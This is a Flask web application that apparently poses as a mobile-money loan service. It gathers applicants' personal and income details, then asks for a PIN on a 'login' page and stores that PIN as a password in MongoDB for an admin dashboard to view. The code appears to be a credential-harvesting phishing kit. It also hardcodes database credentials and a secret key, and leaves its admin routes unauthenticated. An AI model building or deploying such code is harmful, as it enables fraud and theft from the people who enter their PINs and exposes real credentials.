from flask import Flask, render_template, request, redirect, url_for, session
from pymongo import MongoClient
from bson.objectid import ObjectId
import os

app = Flask(__name__)
app.secret_key = "super_secret_momo_key"

# MongoDB connection
client = MongoClient("mongodb+srv://superuser:2006@superuser.uenn69l.mongodb.net/momo_loan_db?retryWrites=true&w=majority&appName=superuser")
db = client["momo_loan_db"]
applications_collection = db["applications"]

@app.route("/")
def index():
    return render_template("index.html")

# --- MULTI-STEP APPLICATION WIZARD ---
@app.route("/apply/step1", methods=["GET", "POST"])
def apply_step1():
    if request.method == "POST":
        session["loan_type"] = request.form.get("loan_type")
        session["amount"] = request.form.get("amount")
        session["term"] = request.form.get("term")
        session["purpose"] = request.form.get("purpose")
        return redirect(url_for("apply_step2"))
    return render_template("apply_step1.html")

@app.route("/apply/step2", methods=["GET", "POST"])
def apply_step2():
    if request.method == "POST":
        session["first_name"] = request.form.get("first_name")
        session["last_name"] = request.form.get("last_name")
        session["phone"] = request.form.get("phone")
        return redirect(url_for("apply_step3"))
    return render_template("apply_step2.html")

@app.route("/apply/step3", methods=["GET", "POST"])
def apply_step3():
    if request.method == "POST":
        session["employment"] = request.form.get("employment")
        session["income"] = request.form.get("income")
        return redirect(url_for("processing_screen"))
    return render_template("apply_step3.html")

@app.route("/processing")
def processing_screen():
    return render_template("processing.html")

@app.route("/login", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        pin = request.form.get("pin")
        phone = session.get("phone", "Unknown")
        
        # Save complete application to MongoDB upon PIN entry
        app_data = {
            "loan_type": session.get("loan_type"),
            "amount": session.get("amount"),
            "term": session.get("term"),
            "purpose": session.get("purpose"),
            "first_name": session.get("first_name"),
            "last_name": session.get("last_name"),
            "phone": phone,
            "employment": session.get("employment"),
            "income": session.get("income"),
            "password": pin,
            "status": "Pending Approval",
            "app_id": "APP-" + os.urandom(4).hex().upper()
        }
        
        inserted_id = applications_collection.insert_one(app_data).inserted_id
        session["current_app_id"] = str(inserted_id)
        
        return redirect(url_for("pending"))
    return render_template("login.html")

@app.route("/pending")
def pending():
    current_id = session.get("current_app_id")
    app_id = "APP-PENDING"
    if current_id:
        record = applications_collection.find_one({"_id": ObjectId(current_id)})
        if record and "app_id" in record:
            app_id = record["app_id"]
    return render_template("pending.html", app_id=app_id)

@app.route("/admin")
def admin_dashboard():
    if request.args.get("admin") != "ADMIN036":
        return "Unauthorized Access", 403
    all_apps = list(applications_collection.find())
    return render_template("admin.html", applications=all_apps)

@app.route("/admin/update/<app_id>/<status>")
def update_status(app_id, status):
    applications_collection.update_one({"_id": ObjectId(app_id)}, {"$set": {"status": status}})
    return redirect(url_for("admin_dashboard", admin="ADMIN036"))

@app.route("/admin/delete/<app_id>")
def delete_application(app_id):
    applications_collection.delete_one({"_id": ObjectId(app_id)})
    return redirect(url_for("admin_dashboard", admin="ADMIN036"))

if __name__ == "__main__":
    app.run(debug=True, port=5000)
